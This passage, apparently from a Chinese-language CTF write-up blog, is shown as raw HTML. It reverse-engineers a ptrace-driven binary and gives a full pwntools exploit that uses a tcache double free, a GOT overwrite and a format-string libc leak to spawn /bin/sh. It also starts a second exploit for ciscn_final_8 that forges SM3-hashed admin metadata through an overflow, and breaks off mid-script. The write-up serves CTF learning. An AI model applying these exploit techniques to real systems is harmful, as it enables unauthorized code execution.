v7 = ptrace(PTRACE_PEEKTEXT, a1, v11, <span class="number">0L</span>L);</span><br><span class="line">        v9 = (<span class="keyword">unsigned</span> __int8)ptrace(PTRACE_PEEKDATA, a1, v11 - <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="number">0xCC</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ptrace(PTRACE_KILL, a1, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)(qword_604948 + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v8 = (*(__int64 (__fastcall **)(<span class="keyword">char</span> *))(qword_604948 + <span class="number">16</span>))(&amp;v10);</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v8 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> ( v8 )</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &lt;= <span class="number">0</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                qword_604948 = v13[--HIDWORD(stat_loc.__iptr)];</span><br><span class="line">                v12 += <span class="number">8L</span>L;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v11 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                ptrace(PTRACE_POKEDATA, a1, v12, *(_QWORD *)(qword_604948 + <span class="number">24</span>));</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">if</span> ( SHIDWORD(stat_loc.__iptr) &gt; <span class="number">48</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v13[SHIDWORD(stat_loc.__iptr)] = *(_QWORD *)qword_604948;</span><br><span class="line">                ++HIDWORD(stat_loc.__iptr);</span><br><span class="line">                v12 -= <span class="number">8L</span>L;</span><br><span class="line">                v4 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">136</span>; ++i )</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">if</span> ( qword_604978[<span class="number">4</span> * i] == v11 )</span><br><span class="line">                &#123;</span><br><span class="line">                    qword_604948 = (__int64)&amp;qword_604960[<span class="number">4</span> * i];</span><br><span class="line">                    v4 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( !v4 )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                v3 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)qword_604948;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            qword_604948 = *(_QWORD *)(qword_604948 + <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">            v11 = *(_QWORD *)(qword_604948 + <span class="number">24</span>);</span><br><span class="line">        ptrace(PTRACE_SETREGS, a1, <span class="number">0L</span>L, &amp;v10); <span class="comment">// set regs</span></span><br><span class="line">        <span class="keyword">if</span> ( ptrace(PTRACE_CONT, a1, <span class="number">0L</span>L, <span class="number">0L</span>L) &lt; <span class="number">0</span> ) <span class="comment">// let child process continue</span></span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">"ptrace"</span>);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">        &#125;</span><br><span class="line">        wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>前面一堆<code>switch</code>啥的就不管了，重点在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，因为设置完寄存器之后，就是通过<code>ptrace(PTRACE_CONT, a1, 0LL, 0LL)</code>把执行权限还给子进程了。</li>
<li>gdb动态调试，断在<code>ptrace(PTRACE_SETREGS, a1, 0LL, &amp;v10);</code>，查看第四个参数也就是<code>rcx</code>指向的位置，这是一个<code>user_regs_struce</code>的结构体（在”/user/include/sys/user.h”可以找到定义）： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r15;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r14;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r13;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r12;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rbx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r11;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r10;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r9;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> r8;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rcx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdx;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rdi;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> orig_rax;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rip;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> cs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> eflags;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> rsp;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ss;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs_base;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ds;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> es;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> fs;</span><br><span class="line">    __extension__ <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>然后就是根据<code>rip</code>去binary里找汇编码，因为都是一段一段的，然后通过<code>int 3</code>返回父进程。所以就只能对着汇编码，借助寄存器的值，手动分析子进程的执行逻辑。</li>
<li>细节就不赘述了（感觉这种方法有点笨，如果有大佬能提供更好的方法，希望可以教教我），分析的结果如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">    function list:</span><br><span class="line">        110 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : size </span><br><span class="line">                second input after &quot;string: &quot; : content (end with &quot;\n&quot;)</span><br><span class="line">                chunk will be added to global variable &quot;chunk_array&quot;</span><br><span class="line">        119 &#x3D;&#x3D;&gt; no use at all, simply &quot;puts(&quot;sorry~\n&quot;);&quot; after input done</span><br><span class="line">        120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">        238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">                free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">                thus bring double free)</span><br><span class="line">        386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">    some global variable:</span><br><span class="line">        0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">        0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">        0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                    the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">    some constraints:</span><br><span class="line">        chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">        can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">        for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">        &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br><span class="line">    &#96;&#96;&#96; </span><br><span class="line">7. 程序没有开PIE。</span><br><span class="line">8. 首先用tcache double free，把&#96;0x6040E0&#96;处的值（可以执行&#96;free&#96;操作的次数）改大一点。</span><br><span class="line">9. 再此利用tcache double free，把&#96;0x605AC0&#96;改到bss上，达到清空&#96;chunk_array&#96;的目的，从而又能分配10个chunk</span><br><span class="line">10. 由于&#96;free&#96;限制解除了，再利用double free改&#96;atoi_got&#96;为&#96;printf_plt&#96;，从而利用fsb来leak栈上的libc地址。</span><br><span class="line">11. 最后double free改&#96;atoi_got&#96;为&#96;system&#96;，输入&quot;&#x2F;bin&#x2F;sh&quot;来getshell。</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def new(size, content, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%110c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(size) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;110&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(size))</span><br><span class="line">    p.sendlineafter(&quot;string:&quot;, content)</span><br><span class="line"></span><br><span class="line">def edit(index, content, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%120c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(index) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;120&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(index))</span><br><span class="line">    p.sendlineafter(&quot;string:&quot;, content)</span><br><span class="line"></span><br><span class="line">def delete(index, trans&#x3D;False):</span><br><span class="line">    if trans &#x3D;&#x3D; True:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%238c&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, &quot;%&quot; + str(index) + &quot;c&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;238&quot;)</span><br><span class="line">        p.sendlineafter(&quot;string:&quot;, str(index))</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">function list:</span><br><span class="line">    110 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : size </span><br><span class="line">            second input after &quot;string: &quot; : content (end with &quot;\n&quot;)</span><br><span class="line">            chunk will be added to global variable &quot;chunk_array&quot;</span><br><span class="line">    119 &#x3D;&#x3D;&gt; no use at all, simply &quot;puts(&quot;sorry~\n&quot;);&quot; after input done</span><br><span class="line">    120 &#x3D;&#x3D;&gt; simply write something on the stack (no use at all)</span><br><span class="line">    238 &#x3D;&#x3D;&gt; first input after &quot;string: &quot; : index</span><br><span class="line">            free the chunk that recently malloc (pointer will not be reset to 0, </span><br><span class="line">            thus bring double free)</span><br><span class="line">    386 &#x3D;&#x3D;&gt; simply exit</span><br><span class="line"></span><br><span class="line">some global variable:</span><br><span class="line">    0x605AC0 &#x3D;&#x3D;&gt; store the address of the chunk_array </span><br><span class="line">    0x604940 &#x3D;&#x3D;&gt; store the address of the present chunk</span><br><span class="line">    0x6040E0 &#x3D;&#x3D;&gt; store the times that &quot;free&quot; can be used (initialize to 4), if use up,</span><br><span class="line">                 the process will print out the chunk_array and simply exit</span><br><span class="line"></span><br><span class="line">some constraints:</span><br><span class="line">    chunk size should satisfy &quot;size &gt; 0 &amp;&amp; size &lt;&#x3D; 0x7F&quot;</span><br><span class="line">    can only malloc at most 10 chunks (according to the free space in chunk_array)</span><br><span class="line">    for &quot;238&quot;(free) function, index should satisfy &quot;index &gt;&#x3D; 0 &amp;&amp; index &lt;&#x3D; 9&quot;</span><br><span class="line">    &quot;238&quot;(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x21b97</span><br><span class="line">system_offset &#x3D; libc.symbols[&quot;system&quot;]</span><br><span class="line">atoi_got &#x3D; elf.got[&quot;atoi&quot;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">bss &#x3D; elf.bss(0x1500)</span><br><span class="line">chunk_array_addr &#x3D; 0x605AC0</span><br><span class="line">delete_times_addr &#x3D; 0x6040e0</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x28, &#39;AAAA&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x38, &#39;BBBB&#39;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># set the delete time to 0xAAA</span><br><span class="line">new(0x28, p64(delete_times_addr)) </span><br><span class="line">new(0x28, &#39;AAAA&#39;) </span><br><span class="line">new(0x28, p64(0xAAA))</span><br><span class="line"></span><br><span class="line"># reset the chunk_array</span><br><span class="line">new(0x38, p64(chunk_array_addr)) </span><br><span class="line">new(0x38, &#39;AAAA&#39;) </span><br><span class="line">new(0x38, p64(bss))</span><br><span class="line"></span><br><span class="line"># double free</span><br><span class="line">new(0x48, &quot;CCCC&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">new(0x58, &quot;DDDD&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line"># write aoti_got to printf_plt</span><br><span class="line">new(0x48, p64(atoi_got)) </span><br><span class="line">new(0x48, &#39;AAAA&#39;) </span><br><span class="line">new(0x48, p64(printf_plt)) </span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;%25$p&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_addr &#x3D; int(p.recv(14)[2:], 16)</span><br><span class="line">libc_base &#x3D; libc_addr - offset</span><br><span class="line">libc_system &#x3D; libc_base + system_offset</span><br><span class="line"></span><br><span class="line"># write atoi_got to system</span><br><span class="line">new(0x58, p64(atoi_got), True)</span><br><span class="line">new(0x58, &quot;DDDD&quot;, True)</span><br><span class="line">new(0x58, p64(libc_system), True)</span><br><span class="line"></span><br><span class="line"># system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">p.sendlineafter(&quot;command&gt;&gt; &quot;, &quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">success(&quot;libc_system: &quot; + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-8"><a href="#ciscn-final-8" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>乍一看好像挺复杂的，其实仔细看看逻辑挺简单的（但是我还是花了蛮久时间的，太菜了）。</p>
<h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol>
<li>在<code>login</code>之后，输入<code>text</code>的长度是可控的而且没有限制，故存在溢出。</li>
<li>在<code>register</code>一个<code>user</code>的时候，会先对输入的<code>password</code>进行SM3散列计算再储存，然后在输入完<code>text</code>之后，对所有的元数据（包括<code>user</code>的名字，<code>password length</code>，<code>password</code>散列，<code>text_len</code>，<code>text</code>）再进行一次SM3散列计算并储存。</li>
<li>之后的每次<code>login</code>都会对这两个散列进行检查。</li>
<li>利用<code>user0</code>的溢出将<code>user1</code>特定的<code>password</code>散列leak出来（比如”0”)。</li>
<li>利用leak出来的<code>password</code>散列，伪造<code>user2</code>用户输入的<code>password</code>为<code>admin2</code>所有元数据（包括名字<code>admin2</code>，<code>password length</code>（1），<code>password</code>散列（之前leak出来的”0”的散列），<code>text_len</code>，<code>text</code>），该元数据的散列值将会被储存在<code>user2</code>的区域。</li>
<li>利用<code>user1</code>的溢出leak出上述提到的<code>admin2</code>的所有元数据的散列。</li>
<li>再次利用<code>user1</code>的溢出覆盖<code>user2</code>为伪造的superuser也就是<code>admin2</code>。</li>
<li>以<code>user2</code>的身份<code>login</code>，此时便能通过superuser也就是<code>admin2</code>的check条件，达到调用<code>getflag</code>功能的目的。</li>
</ol>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(age, passwd_len, passwd, content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please set your age:"</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id, passwd_len, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, input your id"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_content</span><span class="params">(content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># register two user</span></span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = 